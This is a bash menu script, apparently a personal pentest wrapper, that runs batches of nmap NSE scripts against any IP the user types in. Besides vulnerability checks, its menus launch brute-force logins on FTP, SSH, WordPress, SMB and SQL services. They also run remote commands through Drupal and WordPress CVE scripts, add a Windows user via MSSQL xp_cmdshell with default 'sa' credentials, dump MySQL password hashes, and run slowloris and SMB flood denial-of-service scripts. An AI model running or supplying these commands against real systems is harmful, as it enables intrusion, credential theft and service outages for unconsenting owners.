#!/bin/bash
clear

## COLORS

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

sleep 1.0
echo -e "$red[$reset$blue*$reset$red]$reset$yellow Coded by:$reset$magenta"
figlet -f big "vDroPZz"
    sleep 1.0
echo -e $reset
clear
    sleep 1.0

echo -e "$orange###########################"
echo -e "#                         #"
echo -e "#$reset$blue --[CUSTOM NMAP SCANS]--$reset$orange #"
echo -e "#     $reset$blue by vDroPZz  $reset$orange       #"
echo -e "#                         #"
echo -e "###########################$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$magenta"
figlet -f small "NMAP SCRIPT SCANS"
echo -e "$reset"
    sleep 1.0
echo ""
echo ""
echo -e "$red[$reset$blue 01 $reset$red]$reset$green FTP VULN SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 02 $reset$red]$reset$green HTTP VULNEREABLE SCAN (CVE2006-CVE2017)$reset"
    sleep 0.5
echo -e "$red[$reset$blue 03 $reset$red]$reset$green WORDPRESS USERDATA SCAN$reset"
    sleep 0.5
echo -e "$red[$reset$blue 04 $reset$red]$reset$green SAMBA SCANS & VULNS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 05 $reset$red]$reset$green SQL SCANS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 06 $reset$red]$reset$green SSH SCANS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 07 $reset$red]$reset$green SSL SCANS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 08 $reset$red]$reset$green SLOWLORIS SCRIPTS$reset"
    sleep 0.5
echo -e "$red[$reset$blue 09 $reset$red]$reset$green TRACEROUTES$reset"
    sleep 0.5
echo -e "$red[$reset$blue 00 $reset$red]$reset$green BACK$reset"
    sleep 0.5
echo ""
echo ""
echo ""
echo ""
echo -e "$green Your choice: $reset"
    read option;

if [ $option == 1 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 21 -Pn $ip --script=ftp-brute.nse
    nmap -p 21 -Pn $ip --script=ftp-anon.nse
    nmap -p 21 -Pn $ip --script=ftp-proftpd-backdoor.nse
    nmap -p 21 -Pn $ip --script=ftp-syst.nse
    nmap -p 21 -Pn $ip --script=ftp-vsftpd-backdoor.nse
    nmap -p 21 -Pn $ip --script=ftp-vuln-cve2010-4221.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 2 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 80,443 -Pn -sV $ip --script=http-vuln-cve2006-3392.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2009-3960.nse --script-args http-http-vuln-cve2009-3960.root="/root/"
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2010-0738.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2010-2861.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2011-3192.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2011-3368.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2012-1823.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2013-0156.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2013-6786.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2013-7091.nse --script-args http-vuln-cve2013-7091=/ZimBra
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2014-2126.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2014-2127.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2014-2128.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2014-2129.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2014-3704.nse --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal"
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2014-8877.nse --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress"
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2015-1427.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-cve2015-1635.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2017-1001000.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2017-5638.nse
    nmap -p 16992 -Pn $ip --script=http-vuln-cve2017-5689.nse
    nmap -p 80,443 -Pn $ip --script=http-vuln-cve2017-8917.nse --script-args http-vuln-cve2017-8917.uri=joomla/
    nmap -p 7547 -Pn $ip --script=http-vuln-misfortune-cookie.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-vuln-wnr1000-creds.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue..."
        read
fi

if [ $option == 3 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 80,443 -sV -Pn $ip --script=http-wordpress-brute.nse --script-args 'userdb=users.txt,passdb=passwds.txt'
    nmap -p 80,443 -sV -Pn $ip --script=http-wordpress-enum.nse
    nmap -p 80,443 -sV -Pn $ip --script=http-wordpress-users.nse
        echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue..."
        read
fi

if [ $option == 4 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 139,445 -Pn $ip --script=smb2-capabilities.nse
    nmap -p 139,445 -Pn $ip --script=smb2-security-mode.nse
    nmap -p 139,445 -Pn $ip --script=smb2-time.nse
    sudo nmap -p 139,445 -O $ip --script=smb2-vuln-uptime.nse --script-args smb2-vuln-uptime.skip-os=true 
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-brute.nse
    nmap -p 139,445 -Pn $ip --script=smb-double-pulsar-backdoor.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-enum-domains.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-enum-groups.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-enum-processes.nse
    nmap -p 139,445 -Pn $ip --script=smb-enum-services.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-enum-sessions.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-enum-shares.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-enum-users.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-flood.nse
    nmap -p 139,445 -Pn $ip --script=smb-ls.nse
    nmap -p 139,445 -Pn $ip --script=smb-mbenum.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-os-discovery.nse
    nmap -p 139,445 -Pn $ip --script=smb-print-text.nse
    nmap -p 139,445 -Pn $ip --script=smb-protocols.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-psexec.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-security-mode.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-server-stats.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-system-info.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-vuln-conficker.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-vuln-cve2009-3103.nse
    nmap -p 139,445 -Pn $ip --script=smb-vuln-cve-2017-7494.nse --script-args smb-vuln-cve-2017-7494.check-version
    nmap -p 139,445 -Pn $ip --script=smb-vuln-cve-2017-7494.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-vuln-ms06-025.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-vuln-ms07-029.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-vuln-ms08-067.nse
    nmap -p 139,445 -Pn $ip --script=smb-vuln-ms10-054.nse
    nmap -p 139,445 -Pn $ip --script=smb-vuln-ms10-061.nse
    nmap -p 139,445 -Pn $ip --script=smb-vuln-ms17-010.nse
    sudo nmap -sU -sS -p U:137,T:139,445 $ip --script=smb-vuln-regsvc-dos.nse
        echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue..."
        read
fi

if [ $option == 5 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 445,1433 -Pn $ip --script ms-sql-brute --script-args mssql.instance-all,userdb=customer.txt,passdb=custompass.txt
    nmap -p 445,1433 -Pn $ip --script ms-sql-config --script-args mssql.username=sa,mssql.password=sa,mssql.config=showall
    sudo nmap -sU -p U:1434,T:445,1433 -Pn $ip --script ms-sql-dac
    nmap -p 445,1433 -Pn $ip --script ms-sql-empty-password --script-args mssql.instance=all
    nmap -p 445,1433 -Pn $ip --script ms-sql-info
    nmap -p 445,1433 -Pn $ip --script ms-sql-ntlm-info 
    nmap -p 445,1433 -Pn $ip --script ms-sql-query --script-args mssql.username=sa,mssql.password=sa,ms-sql.query="SELECT * FROM master..syslogins"
    nmap -p 445,1433 -Pn $ip --script ms-sql-tables --script-args mssql.username=sa,mssql.password=sa
    nmap -p 445,1433 -Pn $ip --script ms-sql-tables --script-args mssql.username=sa,mssql.password=sa
    nmap -p 445,1433 -Pn $ip --script=ms-sql-xp-cmdshell.nse --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="net user test test /add"
    nmap -p 3306 -Pn $ip --script mysql-info
    nmap -p 3306 -Pn $ip --script mysql-audit --script-args "mysql-audit.username='root',mysql-audit.password='foobar',mysql-audit.filename='nselib/data/mysql-cis.audit'"
    nmap -p 3306 -Pn $ip --script mysql-brute
    nmap -p 3306 -Pn $ip --script mysql-users 
    nmap -p 3306 -Pn $ip --script=mysql-databases.nse
    nmap -p 3306 -Pn $ip --script=mysql-empty-password.nse
    nmap -p 3306 -Pn $ip --script mysql-dump-hashes --script-args='username=root,password=secret'
    nmap -p 3306 -Pn $ip --script=mysql-enum.nse
    nmap -p 3306 -Pn $ip --script=mysql-variables.nse
    nmap -p 3306 -sV $ip --script=mysql-vuln-cve2012-2122.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue..."
        read
fi

if [ $option == 6 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 22 -Pn $ip --script=ssh2-enum-algos.nse
    nmap -p 22 -Pn $ip --script ssh-auth-methods --script-args="ssh.user=<username>"
    nmap -p 22 -Pn $ip --script ssh-brute --script-args userdb=users.lst,passdb=pass.lst,ssh-brute.timeout=4s
    nmap -p 22 -Pn $ip --script ssh-hostkey --script-args ssh_hostkey=all
    nmap -p 22 -Pn $ip --script ssh-publickey-acceptance --script-args 'ssh.usernames={"root", "user"}, publickeys={"./id_rsa1.pub", "./id_rsa2.pub"}'
    nmap -p 22 -Pn -v -d --script=ssh-run --script-args="ssh-run.cmd=ls -l /, ssh-run.username=myusername, ssh-run.password=mypassword"
    nmap -p 22 -Pn $ip --script=sshv1.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue..."
        read
fi

if [ $option == 7 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 443 -Pn $ip --script=ssl-ccs-injection.nse 
    nmap -p 443 -Pn $ip --script ssl-cert-intaddr
    nmap -p 443 -Pn $ip --script=ssl-cert.nse
    nmap -p 5222 -Pn $ip --script=ssl-date.nse
    nmap -p 443 -Pn $ip --script=ssl-dh-params.nse
    nmap -p 443 -sV $ip --script=ssl-enum-ciphers.nse
    nmap -p 443 -Pn $ip --script=ssl-heartbleed.nse
    nmap -p 443 -Pn $ip --script=ssl-known-key.nse
    nmap -p 443 $ip -sV --version-light --script ssl-poodle
    nmap -p 443 -Pn $ip --script=sslv2-drown.nse
    nmap -p 443 -Pn $ip --script=sslv2.nse
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 8 ]; then
    echo -e "$green Enter Tareget IP: $reset"
        read ip;
    nmap -p 80,443 -Pn $ip --script http-slowloris-check
    nmap -p 80,443 -Pn $ip --script http-slowloris --max-parallelism 400 -d
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 9 ]; then
    echo -e "$green Enter Target IP: $reset"
        read ip;
    nmap -p 80 -Pn $ip --script http-trace
    nmap -p 80 -Pn $ip --script http-traceroute
    sudo nmap -Pn $ip --traceroute
    echo ""
    echo ""
    echo ""
    echo -e "$green Press ENTER to continue... $reset"
        read
fi

if [ $option == 0 ]; then
    cd ..
    ./bashtomation.sh
fi

./customnmapscans.sh
/bin/bash